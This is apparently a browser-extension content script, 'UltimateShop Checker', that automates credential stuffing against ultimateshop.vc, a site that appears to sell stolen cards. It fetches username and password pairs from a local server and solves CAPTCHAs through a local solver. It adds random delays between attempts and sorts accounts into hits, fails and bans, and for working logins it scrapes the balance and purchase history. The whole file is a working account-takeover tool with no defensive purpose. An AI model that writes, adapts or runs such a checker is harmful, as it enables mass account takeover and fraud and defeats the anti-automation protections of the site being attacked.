// UltimateShop Checker - Final Version (Multiple Tabs Support)
// Function to generate a random delay between 1 and 3 seconds
function getRandomDelay() {
    return Math.floor(Math.random() * 2000) + 1000; // 1000 to 3000 ms
}

// Global variables
let isChecking = false;
let currentAccountIndex = 0;
let accounts = [];
let captchaImage = null;
let captchaSolution = null;
let isWaitingForCaptcha = false;
let captchaRetryCount = 0;
let MAX_CAPTCHA_RETRIES = 5; // Maximum 5 CAPTCHA retries per account

// Handle CAPTCHA failure with cookie clear and tab close
function handleCaptchaFailure() {
    console.log('UltimateShop Checker: CAPTCHA failure detected, clearing cookies and closing tab...');
    
    // Clear all cookies for ultimateshop.vc
    chrome.runtime.sendMessage({
        type: 'clear_cookies_and_close'
    });
}

// Track CAPTCHA refresh attempts
let captchaRefreshAttempts = 0;
const MAX_CAPTCHA_REFRESH_ATTEMPTS = 2;

// Clear the login form completely
function clearLoginForm() {
    const usernameInput = document.querySelector('#LoginForm_username');
    const passwordInput = document.querySelector('#LoginForm_password');
    const captchaInput = document.querySelector('#LoginForm_verifyCode');
    
    if (usernameInput) usernameInput.value = '';
    if (passwordInput) passwordInput.value = '';
    if (captchaInput) captchaInput.value = '';
    
    console.log('UltimateShop Checker: Login form cleared');
}

// Check if form has old data that needs clearing
function needsFormClearing() {
    const usernameInput = document.querySelector('#LoginForm_username');
    const passwordInput = document.querySelector('#LoginForm_password');
    const captchaInput = document.querySelector('#LoginForm_verifyCode');
    
    // If any field has data, we need to clear
    return (usernameInput && usernameInput.value) || 
           (passwordInput && passwordInput.value) || 
           (captchaInput && captchaInput.value);
}

// Check if we're on the login page
function isLoginPage() {
    return window.location.href.includes('ultimateshop.vc') && 
           document.querySelector('#LoginForm_username');
}

// Check if we're on the success page (after login)
function isSuccessPage() {
    const currentUrl = window.location.href;
    const hasNewsUrl = currentUrl.includes('/news');
    const hasDiscountText = document.body.innerText.includes('Discount :');
    const hasProfileLink = document.querySelector('a[href="/profile"]') !== null;
    const hasAddFunds = document.body.innerText.includes('Add Funds');
    
    console.log('UltimateShop Checker: Success page detection:', {
        url: currentUrl,
        hasNewsUrl,
        hasDiscountText,
        hasProfileLink,
        hasAddFunds
    });
    
    return hasNewsUrl || hasDiscountText || hasProfileLink || hasAddFunds;
}

// Check if we're on the profile page
function isProfilePage() {
    return window.location.href.includes('/profile');
}

// Extract balance and stats from profile page
function extractProfileData() {
    try {
        // Extract Current Balance
        const balanceRow = Array.from(document.querySelectorAll('td')).find(td => 
            td.textContent.trim() === 'Current balance:'
        );
        let balance = '0.00';
        if (balanceRow && balanceRow.nextElementSibling) {
            balance = balanceRow.nextElementSibling.textContent.trim();
        }

        // Extract Total Spent
        const spentRow = Array.from(document.querySelectorAll('td')).find(td => 
            td.textContent.trim() === 'Total spent:'
        );
        let totalSpent = '0';
        if (spentRow && spentRow.nextElementSibling) {
            totalSpent = spentRow.nextElementSibling.textContent.trim();
        }

        // Extract Cards Purchased
        const cardsRow = Array.from(document.querySelectorAll('td')).find(td => 
            td.textContent.trim() === 'Cards purchased:'
        );
        let cardsPurchased = '0';
        if (cardsRow && cardsRow.nextElementSibling) {
            cardsPurchased = cardsRow.nextElementSibling.textContent.trim();
        }

        return {
            balance: balance,
            totalSpent: totalSpent,
            cardsPurchased: cardsPurchased
        };
    } catch (error) {
        console.error('Error extracting profile data:', error);
        return {
            balance: '0.00',
            totalSpent: '0',
            cardsPurchased: '0'
        };
    }
}

// Navigate to profile page after successful login
function navigateToProfile() {
    if (window.location.href.includes('/news')) {
        console.log('UltimateShop Checker: Navigating to profile page...');
        window.location.href = 'https://ultimateshop.vc/profile';
    }
}

// Fallback navigation to profile page
function navigateToProfileFallback() {
    console.log('UltimateShop Checker: Using fallback navigation to profile...');
    
    // Try multiple fallback methods
    const methods = [
        () => {
            // Method 1: History API push
            try {
                window.history.pushState({}, '', '/profile');
                window.location.reload();
                return true;
            } catch (e) {
                return false;
            }
        },
        () => {
            // Method 2: Create and click profile link
            try {
                const link = document.createElement('a');
                link.href = '/profile';
                link.style.display = 'none';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                return true;
            } catch (e) {
                return false;
            }
        },
        () => {
            // Method 3: Force reload with profile URL
            try {
                window.location.href = window.location.origin + '/profile';
                return true;
            } catch (e) {
                return false;
            }
        }
    ];
    
    // Try each method
    for (let i = 0; i < methods.length; i++) {
        if (methods[i]()) {
            console.log(`UltimateShop Checker: Fallback navigation method ${i + 1} successful`);
            return;
        }
    }
    
    console.log('UltimateShop Checker: All fallback methods failed, refreshing page...');
    window.location.reload();
}

// Get error message from the page
function getErrorMessage() {
    const errorElements = document.querySelectorAll('.alert, .error, .text-danger, .help-block');
    
    for (let element of errorElements) {
        const text = element.textContent.trim();
        
        if (text.includes('Incorrect username or password')) {
            return 'Incorrect username or password';
        } else if (text.includes('The verification code is incorrect')) {
            return 'The verification code is incorrect';
        } else if (text.includes('BANNED') || text.includes('banned') || text.includes('Banned')) {
            return 'BANNED';
        } else if (text.includes('confirm') || text.includes('maintenance')) {
            return 'SITE_ISSUE';
        }
    }
    
    // Also check body text for BANNED
    const bodyText = document.body.innerText;
    if (bodyText.includes('BANNED') || bodyText.includes('banned') || bodyText.includes('Banned')) {
        return 'BANNED';
    }
    
    return null;
}

// Retry login with new CAPTCHA using same credentials
async function retryWithNewCaptcha() {
    const usernameInput = document.querySelector('#LoginForm_username');
    const passwordInput = document.querySelector('#LoginForm_password');
    
    if (usernameInput && passwordInput) {
        // Get stored credentials
        const username = sessionStorage.getItem('current_username');
        const password = sessionStorage.getItem('current_password');
        
        if (username && password) {
            // Fill in the form
            usernameInput.value = username;
            passwordInput.value = password;
            
            // Trigger input events
            usernameInput.dispatchEvent(new Event('input', { bubbles: true }));
            passwordInput.dispatchEvent(new Event('input', { bubbles: true }));
            
            // Wait a bit and then get new CAPTCHA
            setTimeout(() => {
                getCaptcha();
            }, 1000);
        }
    }
}

// Wait for CAPTCHA image to appear with retry mechanism
function waitForCaptcha(maxAttempts = 10, interval = 1000) {
    return new Promise((resolve, reject) => {
        let attempts = 0;
        
        const checkCaptcha = () => {
            attempts++;
            console.log(`UltimateShop Checker: Checking for CAPTCHA image (attempt ${attempts}/${maxAttempts})...`);
            
            // Try multiple selectors for CAPTCHA
            const captchaImg = document.querySelector('#yw0') || 
                              document.querySelector('img[src*="captcha"]') ||
                              document.querySelector('img[src*="verify"]') ||
                              document.querySelector('.captcha img') ||
                              document.querySelector('img[alt*="captcha"]') ||
                              document.querySelector('img[alt*="verify"]');
            
            if (captchaImg && captchaImg.src && captchaImg.src !== '') {
                console.log('UltimateShop Checker: CAPTCHA image found!');
                resolve(captchaImg);
                return;
            }
            
            if (attempts >= maxAttempts) {
                console.log('UltimateShop Checker: CAPTCHA image not found after max attempts');
                
                // Increment refresh attempts
                captchaRefreshAttempts++;
                console.log(`UltimateShop Checker: CAPTCHA refresh attempt ${captchaRefreshAttempts}/${MAX_CAPTCHA_REFRESH_ATTEMPTS}`);
                
                if (captchaRefreshAttempts >= MAX_CAPTCHA_REFRESH_ATTEMPTS) {
                    console.log('UltimateShop Checker: Max CAPTCHA refresh attempts reached, clearing cookies and closing tab...');
                    handleCaptchaFailure();
                    reject(new Error('CAPTCHA image not found after max refresh attempts'));
                } else {
                    reject(new Error('CAPTCHA image not found'));
                }
                return;
            }
            
            // Wait and try again
            setTimeout(checkCaptcha, interval);
        };
        
        checkCaptcha();
    });
}

// Get CAPTCHA with enhanced detection
async function getCaptcha() {
    try {
        console.log('UltimateShop Checker: Waiting for CAPTCHA image...');
        
        // Wait for CAPTCHA to appear
        const captchaImg = await waitForCaptcha(15, 800); // 15 attempts, 800ms intervals
        
        if (!captchaImg || !captchaImg.src) {
            throw new Error('CAPTCHA image not available');
        }
        
        // Check if image is actually loaded
        if (captchaImg.complete && captchaImg.naturalWidth > 0) {
            console.log('UltimateShop Checker: CAPTCHA image fully loaded');
        } else {
            // Wait for image to load
            await new Promise((resolve) => {
                captchaImg.onload = resolve;
                captchaImg.onerror = () => resolve(); // Continue even if error
                // Timeout after 3 seconds
                setTimeout(resolve, 3000);
            });
        }
        
        // Convert to base64
        const canvas = document.createElement('canvas');
        canvas.width = captchaImg.width;
        canvas.height = captchaImg.height;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(captchaImg, 0, 0);
        const base64Image = canvas.toDataURL().split(',')[1];
        
        console.log('UltimateShop Checker: CAPTCHA captured, solving...');
        
        // Solve CAPTCHA
        const response = await fetch('http://localhost:5050/solve-captcha', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: base64Image })
        });
        
        if (!response.ok) {
            throw new Error('Failed to solve CAPTCHA');
        }
        
        const { captcha: solvedCaptcha } = await response.json();
        console.log('UltimateShop Checker: CAPTCHA solved:', solvedCaptcha);
        
        // Fill CAPTCHA input
        const captchaInput = document.querySelector('#LoginForm_verifyCode');
        if (captchaInput) {
            captchaInput.value = solvedCaptcha;
            captchaInput.dispatchEvent(new Event('input', { bubbles: true }));
            console.log('UltimateShop Checker: CAPTCHA filled in form');
        }
        
        return solvedCaptcha;
        
    } catch (error) {
        console.error('UltimateShop Checker: Error getting CAPTCHA:', error);
        
        // If CAPTCHA fails, try to refresh and retry
        if (error.message.includes('CAPTCHA image not found')) {
            if (captchaRefreshAttempts >= MAX_CAPTCHA_REFRESH_ATTEMPTS) {
                console.log('UltimateShop Checker: Max CAPTCHA refresh attempts reached, clearing cookies and closing tab...');
                handleCaptchaFailure();
            } else {
                console.log('UltimateShop Checker: CAPTCHA not found, refreshing page...');
                setTimeout(() => {
                    window.location.reload();
                }, 2000);
            }
        }
        
        return null;
    }
}

// Refresh CAPTCHA if needed
function refreshCaptcha() {
    const captchaImg = document.querySelector('#yw0') || 
                      document.querySelector('img[src*="captcha"]') ||
                      document.querySelector('img[src*="verify"]');
    
    if (captchaImg) {
        // Force refresh by adding timestamp to src
        const currentSrc = captchaImg.src;
        const separator = currentSrc.includes('?') ? '&' : '?';
        captchaImg.src = currentSrc + separator + 't=' + Date.now();
        console.log('UltimateShop Checker: CAPTCHA refreshed');
    }
}

// Check if CAPTCHA is visible and working
function isCaptchaVisible() {
    const captchaImg = document.querySelector('#yw0') || 
                      document.querySelector('img[src*="captcha"]') ||
                      document.querySelector('img[src*="verify"]');
    
    if (!captchaImg) return false;
    
    // Check if image is loaded and visible
    return captchaImg.src && 
           captchaImg.src !== '' && 
           captchaImg.complete && 
           captchaImg.naturalWidth > 0 &&
           captchaImg.offsetWidth > 0 &&
           captchaImg.offsetHeight > 0;
}

// Perform the full login automation on the login page
async function performLoginAutomation() {
    if (isChecking) {
        console.log('UltimateShop Checker: Already checking, skipping...');
        return;
    }
    
    // Reset CAPTCHA retry counter for new account
    captchaRetryCount = 0;
    captchaRefreshAttempts = 0; // Reset refresh attempts for new account
    
    console.log('UltimateShop Checker: Starting login automation...');
    isChecking = true;
    
    const usernameInput = document.querySelector('#LoginForm_username');
    const passwordInput = document.querySelector('#LoginForm_password');
    const captchaImg = document.querySelector('#yw0');
    const captchaInput = document.querySelector('#LoginForm_verifyCode');
    const submitButton = document.querySelector('#login-form > div > div > div > div > div > div.mb-3.mb-0.text-center > button');

    if (!usernameInput || !passwordInput || !captchaImg || !captchaInput || !submitButton) {
        console.log('UltimateShop Checker: Form elements not found on login page.');
        return;
    }

    try {
        const credsResponse = await fetch('http://localhost:5050/get-creds');
        if (!credsResponse.ok) {
            if (credsResponse.status === 404) {
                console.log('UltimateShop Checker: No credentials left.');
                return;
            }
            throw new Error('Failed to fetch credentials');
        }
        const { username, password } = await credsResponse.json();

        sessionStorage.setItem('current_username', username);
        sessionStorage.setItem('current_password', password);

        usernameInput.value = username;
        passwordInput.value = password;
        console.log('UltimateShop Checker: Filled username and password.');

        // Get and solve CAPTCHA
        const captchaSolution = await getCaptcha();
        if (!captchaSolution) {
            console.log('UltimateShop Checker: Failed to get CAPTCHA, retrying...');
            isChecking = false;
            setTimeout(performLoginAutomation, 3000);
            return;
        }
        
        console.log('UltimateShop Checker: CAPTCHA solved, proceeding with login...');
        
        // Wait a bit before submitting
        const delay = getRandomDelay();
        setTimeout(() => {
            submitButton.click();
            console.log('UltimateShop Checker: Login button clicked.');
            isChecking = false;
        }, delay);
    } catch (error) {
        console.error('UltimateShop Checker: Error during login automation:', error);
    }
}

// Handle navigation and login based on the current page
function handlePage() {
    console.log('UltimateShop Checker: Current URL:', window.location.href);
    
    if (isLoginPage()) {
        console.log('UltimateShop Checker: Handling login page...');
        
        const error = getErrorMessage();
        if (error) {
            if (error === 'BANNED') {
                console.log('UltimateShop Checker: Account BANNED, skipping...');
                
                // Report as BANNED
                const username = sessionStorage.getItem('current_username');
                const password = sessionStorage.getItem('current_password');
                if (username && password) {
                    chrome.runtime.sendMessage({
                        type: 'banned_detected',
                        username,
                        password
                    });
                    sessionStorage.removeItem('current_username');
                    sessionStorage.removeItem('current_password');
                }
                
                // Try next account
                setTimeout(performLoginAutomation, 1000);
                
            } else if (error === 'SITE_ISSUE') {
                console.log('UltimateShop Checker: Site issue detected, trying to resolve...');
                
                // Try to handle site issue
                // If can't resolve, refresh and retry
                setTimeout(() => {
                    console.log('UltimateShop Checker: Refreshing tab to resolve site issue...');
                    window.location.reload();
                }, 2000);
                
            } else if (error === 'The verification code is incorrect') {
                console.log('UltimateShop Checker: CAPTCHA incorrect, attempt:', captchaRetryCount + 1, 'of', MAX_CAPTCHA_RETRIES);
                
                // Check if we've exceeded max retries
                if (captchaRetryCount >= MAX_CAPTCHA_RETRIES) {
                    console.log('UltimateShop Checker: Max CAPTCHA retries reached, trying next account...');
                    
                    // Report as FAIL due to CAPTCHA issues
                    const username = sessionStorage.getItem('current_username');
                    const password = sessionStorage.getItem('current_password');
                    if (username && password) {
                        chrome.runtime.sendMessage({
                            type: 'fail_detected',
                            username,
                            password
                        });
                        sessionStorage.removeItem('current_username');
                        sessionStorage.removeItem('current_password');
                    }
                    
                    // Reset counter and try next account
                    captchaRetryCount = 0;
                    setTimeout(performLoginAutomation, 1000);
                    return;
                }
                
                // Increment retry counter
                captchaRetryCount++;
                
                // Keep retrying with same account
                const username = sessionStorage.getItem('current_username');
                const password = sessionStorage.getItem('current_password');
                
                if (username && password) {
                    // Clear current session for fresh CAPTCHA
                    sessionStorage.removeItem('current_username');
                    sessionStorage.removeItem('current_password');
                    
                    // Clear the form completely before refresh
                    clearLoginForm();
                    
                    // Refresh tab to get fresh CAPTCHA
                    setTimeout(() => {
                        console.log('UltimateShop Checker: Refreshing tab to get fresh CAPTCHA (retry', captchaRetryCount, 'of', MAX_CAPTCHA_RETRIES, ')...');
                        window.location.reload();
                    }, 1000);
                } else {
                    // No credentials, try next account
                    captchaRetryCount = 0;
                    setTimeout(performLoginAutomation, 1000);
                }
                
            } else if (error === 'Incorrect username or password') {
                // Report as FAIL
                const username = sessionStorage.getItem('current_username');
                const password = sessionStorage.getItem('current_password');
                if (username && password) {
                    chrome.runtime.sendMessage({
                        type: 'fail_detected',
                        username,
                        password
                    });
                    sessionStorage.removeItem('current_password');
                    sessionStorage.removeItem('current_username');
                }
                // Try next account
                setTimeout(performLoginAutomation, 1000);
            }
        } else {
            // Check if form needs clearing first
            if (needsFormClearing()) {
                console.log('UltimateShop Checker: Form has old data, clearing first...');
                clearLoginForm();
                // Wait a bit for form to clear, then start automation
                setTimeout(() => {
                    performLoginAutomation();
                }, 1000);
            } else {
                performLoginAutomation();
            }
        }
    } else if (isSuccessPage()) {
        console.log('UltimateShop Checker: Login successful! Navigating to profile...');
        
        // Clear the checking flag to allow new operations
        isChecking = false;
        
        // Try multiple navigation methods
        setTimeout(() => {
            console.log('UltimateShop Checker: Attempting to navigate to profile...');
            
            // Method 1: Direct URL change
            try {
                window.location.href = 'https://ultimateshop.vc/profile';
                console.log('UltimateShop Checker: Navigation method 1: Direct URL change');
                
                // Check if navigation was successful after 2 seconds
                setTimeout(() => {
                    if (window.location.href.includes('/profile')) {
                        console.log('UltimateShop Checker: Navigation successful to profile page');
                    } else {
                        console.log('UltimateShop Checker: Navigation failed, trying fallback method...');
                        navigateToProfileFallback();
                    }
                }, 2000);
                
            } catch (error) {
                console.log('UltimateShop Checker: Method 1 failed, trying method 2...');
                
                // Method 2: Click profile link if available
                const profileLink = document.querySelector('a[href="/profile"]');
                if (profileLink) {
                    profileLink.click();
                    console.log('UltimateShop Checker: Navigation method 2: Clicked profile link');
                } else {
                    console.log('UltimateShop Checker: Method 2 failed, trying method 3...');
                    
                    // Method 3: Use window.location.replace
                    try {
                        window.location.replace('https://ultimateshop.vc/profile');
                        console.log('UltimateShop Checker: Navigation method 3: window.location.replace');
                    } catch (error2) {
                        console.log('UltimateShop Checker: All navigation methods failed, refreshing page...');
                        
                        // Method 4: Refresh and try again
                        setTimeout(() => {
                            window.location.reload();
                        }, 2000);
                    }
                }
            }
        }, 3000); // Increased wait time to 3 seconds
        
    } else if (isProfilePage()) {
        console.log('UltimateShop Checker: On profile page, extracting data...');
        
        // Clear the checking flag
        isChecking = false;
        
        const username = sessionStorage.getItem('current_username');
        const password = sessionStorage.getItem('current_password');
        if (username && password) {
            const profileData = extractProfileData();
            console.log('UltimateShop Checker: Profile data extracted:', profileData);
            
            chrome.runtime.sendMessage({
                type: 'hit_detected',
                username,
                password,
                balance: profileData.balance,
                totalSpent: profileData.totalSpent,
                cardsPurchased: profileData.cardsPurchased
            });
            sessionStorage.removeItem('current_username');
            sessionStorage.removeItem('current_password');
            
            // Auto-refresh tab for next account after 3 seconds
            setTimeout(() => {
                console.log('UltimateShop Checker: Refreshing tab for next account...');
                window.location.reload();
            }, 3000);
        } else {
            console.log('UltimateShop Checker: No credentials found on profile page, refreshing...');
            setTimeout(() => {
                window.location.reload();
            }, 2000);
        }
    }
}

// Auto-start checking when page loads
function autoStartChecking() {
    console.log('UltimateShop Checker: Auto-starting...');
    
    // Check if we're on login page and form is clean
    if (isLoginPage()) {
        // Check if form needs clearing first
        if (needsFormClearing()) {
            console.log('UltimateShop Checker: Form has old data on auto-start, clearing first...');
            clearLoginForm();
            // Wait for form to clear, then start
            setTimeout(() => {
                performLoginAutomation();
            }, 1500);
        } else {
            // Check CAPTCHA state before starting
            if (!isCaptchaVisible()) {
                console.log('UltimateShop Checker: CAPTCHA not visible, refreshing...');
                refreshCaptcha();
                // Wait for CAPTCHA to load
                setTimeout(() => {
                    performLoginAutomation();
                }, 2000);
            } else {
                performLoginAutomation();
            }
        }
    } else {
        console.log('UltimateShop Checker: Not on login page, waiting...');
    }
}

// Run when the page loads
window.addEventListener('load', () => {
    console.log('UltimateShop Checker: Page loaded, checking form state...');
    
    // Clear form if it has old data
    if (isLoginPage() && needsFormClearing()) {
        console.log('UltimateShop Checker: Clearing old form data on page load...');
        clearLoginForm();
    }
    
    // Auto-start checking after page loads
    setTimeout(() => {
        autoStartChecking();
    }, 2000);
});

// Also run when DOM is ready
document.addEventListener('DOMContentLoaded', () => {
    console.log('UltimateShop Checker: DOM ready, checking form state...');
    
    // Clear form if it has old data
    if (isLoginPage() && needsFormClearing()) {
        console.log('UltimateShop Checker: Clearing old form data on DOM ready...');
        clearLoginForm();
    }
    
    autoStartChecking();
});

// Observe DOM changes for dynamic content
const observer = new MutationObserver(() => {
    // Only handle page if we don't have current credentials
    if (!sessionStorage.getItem('current_username')) {
        handlePage();
    }
});
observer.observe(document.body, { childList: true, subtree: true });

// Auto-refresh page if stuck on login for too long
setInterval(() => {
    if (isLoginPage() && !sessionStorage.getItem('current_username')) {
        console.log('UltimateShop Checker: Page stuck, refreshing...');
        window.location.reload();
    }
}, 30000); // 30 seconds